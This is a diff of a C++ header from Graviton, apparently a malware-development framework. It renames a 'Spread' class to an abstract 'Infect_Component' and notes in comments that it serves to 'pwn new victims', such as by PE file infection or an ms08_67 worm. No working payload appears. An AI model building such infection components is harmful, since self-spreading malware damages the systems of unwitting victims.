@@ -20,20 +20,23 @@
  * You should have received a copy of the GNU General Public License
  * along with Graviton.  If not, see http://www.gnu.org/licenses/.
  *
- * @brief GraVitoN::Spread
+ * @brief GraVitoN::Infect::Infect_Component
  *
 */
 
 #ifndef _GVN_SPREAD_HEAD_
 #define _GVN_SPREAD_HEAD_
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-#include "../graviton.hpp"
+#include <graviton.hpp>
 
 namespace GraVitoN
 {
+
+namespace Infect
+{
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
- * @brief Spread techniques
+ * @brief Infection techniques
  *
  * The main idea of Spreading is to design components that letting us pwn
  * new victims during an attack.\n
@@ -41,17 +44,17 @@ namespace GraVitoN
  * 1. a windows virus spreads using PE file infection \n
  * 2. a windows worm spreads using ms08_67 exploit \n
  */
-class Spread : public Component
+class Infect_Component : public Core::Component
 {
 public:
 	/// Constructor
-    Spread();
+    Infect_Component();
 	
 	/// Destructor
-    virtual ~Spread();
+    virtual ~Infect_Component();
 
 	/**
-         * @brief Execute Spread Technique
+     * @brief Execute Spread Technique
 	 *
 	 * Calling this method means you want to DO someone/something!
 	 * 
@@ -59,24 +62,20 @@ public:
 	 * Was it successfull, or not?!
 	 * 
 	 */ 
-	virtual bool run();
+    virtual bool run() = 0;
 };
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Spread::Spread()
+Infect_Component::Infect_Component()
 {
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Spread::~Spread()
+Infect_Component::~Infect_Component()
 {
 }
 
-//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Spread::run()
-{
-	Logger::logItLn("Spread...");
-	return true;
+
 }
 }
 
